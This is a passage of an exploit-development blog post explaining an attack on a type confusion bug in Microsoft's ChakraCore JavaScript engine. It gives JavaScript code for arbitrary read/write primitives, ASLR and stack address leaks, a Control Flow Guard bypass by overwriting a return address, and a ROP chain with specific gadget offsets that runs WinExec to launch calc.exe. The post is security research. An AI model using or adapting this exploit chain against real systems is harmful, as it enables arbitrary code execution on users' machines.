</span></span><span style=display:flex><span>    <span style=color:#a6e22e>write32</span>(<span style=color:#a6e22e>addr</span><span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>, <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>((<span style=color:#a6e22e>value</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>0x100000000</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>));
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The function <code>write32</code>, accepts two parameters, which are the address to write to and the value to write. Since we cannot write a full QWORD, in <code>write64</code>, we split the value into a high DWORD and a low DWORD, and write them in 2 consecutive writes, with the first write happening at the address specified, while the second write happens 4 bytes from the address specified.</p><p>Up till now, we have managed to turn the type confusion vulnerability into a read and write primitive. From the example we have shown, we were also able to leak the address of a method within ChakraCore, bypassing ASLR.</p><h2 id=code-execution>Code Execution</h2><p>Armed with the read and write primitives, we can now shift our focus to gaining code execution. This requires us to gain control of the instruction pointer. Before we get to how we managed to get code execution, it is important to understand a security mitigation.</p><p>Since we are able to write at any address, we can gain control over the instruction pointer by overwriting an entry in an object&rsquo;s vtable and invoking the matching function on the object. Unfortunately a security mitigation called Control Flow Guard (CFG) does not allow us call arbitrary functions as we shall see in the next sections.</p><h3 id=cfg-internals>CFG Internals</h3><p>CFG was introduced in Windows 8.1 update 3 and its purpose is to mitigate techniques such as overwriting a vtable entry. Calls to functions can either be direct calls or indirect calls. A direct call is an assembly instruction that calls a function pointer directly in the same executable or from an import table. An example of this in assembly would be as follows</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>call</span> <span style=color:#66d9ef>chakracore</span>!<span style=color:#66d9ef>ThreadContext</span>::<span style=color:#66d9ef>ProbeStack</span> 
</span></span></code></pre></div><p>An indirect call is performed by looking for a function pointer through a lookup table, moving it into a register and calling the register. A very simple example of this would be</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>rax</span>, <span style=color:#66d9ef>QWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rcx</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>0x8</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span> <span style=color:#66d9ef>rax</span>
</span></span></code></pre></div><p>CFG offers protection in indirect calls by verifying that the caller can call the callee against a bitmap which is usually created at compile time. The bitmap is usually marked as read-only, thus no changes can occur, however the <code>SetProcessValidCallTargets</code> API can allow or disallow specific function calls.</p><p>Vtables use indirect calls, which means if CFG is enabled at compile time, verification on vtable address is on. In Microsoft Edge, CFG is enabled, thus it was enabled in ChakraCore.</p><p>Although CFG offers this protection, it does not come without faults and bypasses have been known since its inception. There are three generic techniques one can use to bypass CFG:</p><ul><li>out-of-context calls - this method stays within the parameters of CFG by performing a call to a valid call target. While this method can be used, it can be hard to find usable valid call targets and controlling the parameters</li><li>a data only attack - this method requires modifying critical data structures. Such modifications could then open other avenues for exploitation</li><li>return address overwrite - this method involves leaking a return address on the stack and overwriting it. On return from the function call, execution resumes at the overwritten address</li></ul><h3 id=cfg-bypass---return-address-overwrite>CFG Bypass - Return Address Overwrite</h3><p>As discussed previously, there are multiple ways to bypass CFG and for this exploit we chose to overwrite a return address on the stack. An application can modify its execution flow through:</p><ul><li>a call instruction</li><li>a branch instruction</li><li>a return instruction</li></ul><p>CFG protects against tampering in an indirect call. This is also known as forward edge, and CFG performs forward flow control. Once a function is finished its execution, it hits a return instruction (called <code>ret</code>). The purpose of this instruction is to bring execution back to the callee. This is known as backwards edge and CFG does not offer protection on it.</p><p>Having chosen our method of exploitation, and knowing how to bypass CFG, we can leak the address of the stack for the current thread, find a suitable return address, and overwrite it. This would give us control of instruction pointer without being stopped by CFG.</p><p>Luckily for us, in ChakraCore, there is a variable called <code>globalListFirst</code>. The variable contains the address of a heap buffer, within which we&rsquo;ll find a stack address for the current thread.</p><p><img src=/posts/cve-2018-3408/globalListFirst.png width=456 height=46 srcset="/posts/cve-2018-3408/globalListFirst_hu11681265011681412917.png 480w, /posts/cve-2018-3408/globalListFirst_hu15274430953707870204.png 1024w" loading=lazy alt="globalListFirst in ChakraCore" class=gallery-image data-flex-grow=991 data-flex-basis=2379px></p><p>From the heap buffer located at <code>globalListFirst</code>, we find that at offset 0x498 is an addreess that is within the range specified StackBase and StackLimit in the current thread. We can confirm it is a stack address for the current thread.</p><p><img src=/posts/cve-2018-3408/stackaddress.png width=542 height=151 srcset="/posts/cve-2018-3408/stackaddress_hu4828690284825757548.png 480w, /posts/cve-2018-3408/stackaddress_hu13041526997735078899.png 1024w" loading=lazy alt="Heap buffer at offset 0x498 contains a stack address" class=gallery-image data-flex-grow=358 data-flex-basis=861px></p><p>Using this information, together with the arbitrary read primitive and the base address of ChakraCore, we can easily leak the stack address. This can be done by adding the offset for <code>globalListFirst</code> (0x6c89b0) to the base address of ChakraCore and use the read primitive.</p><p>Next, we need to find a suitable return address to overwrite. From the call stack we see that function <code>amd64_CallFunction</code> appears multiple times. This function is used to call static JavaScript methods and also larger compiled script blocks.</p><p>The earliest occurence of <code>amd64_CallFunction</code> in the call stack, which is the one that is at the bottom of the stack trace, should cover the whole execution of our script.</p><p><img src=/posts/cve-2018-3408/returnaddressorig.png width=1416 height=451 srcset="/posts/cve-2018-3408/returnaddressorig_hu13844013426923376675.png 480w, /posts/cve-2018-3408/returnaddressorig_hu8623139207195970522.png 1024w" loading=lazy alt="Original return address we will be overwriting" class=gallery-image data-flex-grow=313 data-flex-basis=753px></p><p>This means that the return address is not executed before our execution is about to end, making it a very stable target to overwrite.</p><p>From running the exploit multiple times, the difference between the leaked stack address and the stack address which holds the last return address to <code>amd64_CallFunction</code> is not constant. This means we need to use our read primitive to read values from the current stack address, compare it with the calculated return address of <code>amd64_CallFunction</code> and then, if the address is found, we stop and store the current stack address and if not, we go back 8 bytes, and repeat the process.</p><p>The snippet below does what we just described above.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>globalListFirst</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x6c89b0</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] globatlListFirst: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>globalListFirst</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>threadBuffer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>globalListFirst</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] threadBuffer: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>threadBuffer</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>stackAddr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>threadBuffer</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x498</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] stackAddr: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>stackAddr</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>returnAddr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0482352</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] returnAddr: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>returnAddr</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>stackAddr</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>value</span> <span style=color:#f92672>==</span> <span style=color:#a6e22e>returnAddr</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>stackAddr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>stackAddr</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Found return address at: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>stackAddr</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>stackAddr</span>, <span style=color:#ae81ff>0x414141414141</span>);
</span></span><span style=display:flex><span>Math.<span style=color:#a6e22e>sin</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    
</span></span></code></pre></div><p>Once the return address has been found, the value at this stack address is overwritten with the address we want to return to. For the purposes of this example, we overwrite the address with 0x414141414141. As we can see below, the call stack shows that we have successfully overwritten the return address.</p><p><img src=/posts/cve-2018-3408/overwrittenreturnaddr.png width=876 height=422 srcset="/posts/cve-2018-3408/overwrittenreturnaddr_hu16433466746568144136.png 480w, /posts/cve-2018-3408/overwrittenreturnaddr_hu5692665132793213346.png 1024w" loading=lazy alt="Overwritten stack return address" class=gallery-image data-flex-grow=207 data-flex-basis=498px></p><p>The call stack is now corrupted with our dummy address of 0x414141414141. Letting the execution continue we see an access violation when execution is transferred back to the overwritten return address of 0x414141414141.</p><p><img src=/posts/cve-2018-3408/accessviolationexec.png width=578 height=99 srcset="/posts/cve-2018-3408/accessviolationexec_hu11985757673553679974.png 480w, /posts/cve-2018-3408/accessviolationexec_hu11433748783420987153.png 1024w" loading=lazy alt="Access violation on trying to execute code at 0x414141414141" class=gallery-image data-flex-grow=583 data-flex-basis=1401px></p><p>As we can see, we have reliably obtained code execution while bypassing CFG.</p><h3 id=rop-chain>ROP chain</h3><p>Having gained code execution, we can now build a ROP chain.</p><p>Before we start building our ROP chain, we need to identify what code we will be running. The idea for this proof of concept is to execute the <code>WinExec</code> API to launch <code>calc.exe</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#a6e22e>WinExec</span>(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>System32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>calc.exe&#34;</span>, TRUE);
</span></span></code></pre></div><p>This means we need to leak the address of <code>WinExec</code>. Fortunately, the ChakraCore module, for which we already have the base address, imports functions from the Kernel32 module, which is the module in which <code>WinExec</code> can be found. By using our read primitive, we can read the address of an imported function from Kernel32. Then by subtracting its constant offset within Kernel32, we get the base address of the Kernel32 module.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>kernel32_leak</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x55a048</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Leaked kernel32 address: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>kernel32_leak</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>kernel32_base</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>kernel32_leak</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x15da0</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Kernel32 base: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>kernel32_base</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>)); 
</span></span></code></pre></div><p>Now we are ready to start building the ROP chain. We&rsquo;ll be using the <code>fake_object</code> array to write the our ROP chain in. For this we use an arbitrary offset within the <code>fake_object</code> which doesn&rsquo;t overwrite our fake <code>DataView</code> object as we need it to perform arbitrary reads and writes. We&rsquo;ll also need a place where we can store the string containing the location of <code>calc.exe</code>. The following snippet shows the selection of these locations.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>rop</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x348</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>exeLoc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>rop</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x500</span>;
</span></span></code></pre></div><p>Next we&rsquo;ll write the string as 32-bit integers representing each byte in ASCII. The conversion from ASCII to 32-bit integers is outside of the scope of this post but can be done by splitting the string into 4 byte chunks, converting each byte to its hexadecimal representation and reversing each 4 byte group since we are running on an x86 little endian architecture. The code for filling in the memory with the string can be found below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#75715e>// C:\Windows\System32\calc.exe
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>cmdExe</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0x575c3a43</span>, <span style=color:#ae81ff>0x6f646e69</span>, <span style=color:#ae81ff>0x535c7377</span>, <span style=color:#ae81ff>0x65747379</span>, <span style=color:#ae81ff>0x5c32336d</span>, <span style=color:#ae81ff>0x636c6163</span>, <span style=color:#ae81ff>0x6578652e</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>cmdExe</span>.<span style=color:#a6e22e>length</span>; <span style=color:#f92672>++</span><span style=color:#a6e22e>i</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>write32</span>(<span style=color:#a6e22e>exeLoc</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>, <span style=color:#a6e22e>cmdExe</span>[<span style=color:#a6e22e>i</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Finally we&rsquo;ll come to the actual ROP chain. Following the x64 calling convention, the two parameters for the <code>WinExec</code> function should be passed into the RCX and RDX registers. For this we require 2 ROP gadgets with which we can set the RCX and RDX registers. These setup our parameters which will be used in the execution of <code>WinExec</code>. Once the parameters are filled with the correct data, we pass execution directly to <code>WinExec</code>. The full ROP chain can be found in the code snippet below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#75715e>//0x180196522: pop rdx ; ret  ;  (1 found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>rop</span>, <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x196522</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>rop</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x08</span>, <span style=color:#ae81ff>0x1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//0x180012df8: pop rcx ; ret  ;  (1 found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>rop</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x10</span>, <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x12df8</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>rop</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x18</span>, <span style=color:#a6e22e>exeLoc</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//call WinExec - kernelbase + 0x5f0e0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>rop</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x20</span>, <span style=color:#a6e22e>kernel32_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x5f0e0</span>);
</span></span></code></pre></div><p>Finally we need a stack pivot which will overwrite the return stack address. This is simply done using the following 2 line ROP chain</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#75715e>//0x180007cde: pop rsp ; ret  ;  (1 found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>stackAddr</span>, <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x7cde</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>stackAddr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>, <span style=color:#a6e22e>rop</span>);
</span></span></code></pre></div><p>The following video shows this proof of concept running</p><div class=video-wrapper><video controls src=poc.mp4><p>Your browser doesn't support HTML5 video. Here is a
<a href=poc.mp4>link to the video</a> instead.</p></video></div><h2 id=possible-enhancements>Possible enhancements</h2><p>The exploit built here serves only as a proof of concept, and can obviously be improved in several ways.</p><p>Although the code runs in ChakraCore, where we&rsquo;re using the standalone <code>ch.exe</code>, the ROP chain at the end does not handle continuation of the executable to run. Since ChakraCore happens to be JavaScript engine for the old Microsoft Edge, a proper exploit should handle proper restoration of the stack frame</p><p>The CFG bypass used here exploits the fact that CFG lacks backward flow control. Technologies such as Intel&rsquo;s Control-flow Enforcement Technologies (CET) offer both forward and backward flow control. Intel CET handles backward flow control through the concept of a Shadow Stack. With Shadow Stacks, two stacks are used per thread, with the first stack being used as a normal stack and the second stack containing only return addresses. When returning from a function, if the address on the normal stack does not match the address in the shadow stack, meaning it has been modified, the application is terminated. Such technologies would force us to use other CFG bypasses such as data only attacks</p></section><footer class=article-footer><section class=article-tags><a href=/tags/chakra/>Chakra</a>
<a href=/tags/cve-2018-3048/>Cve-2018-3048</a>
<a href=/tags/exploit/>Exploit</a></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><footer class=site-footer><section class=copyright>&copy;
2024 ExEcc0dE's blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.27.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>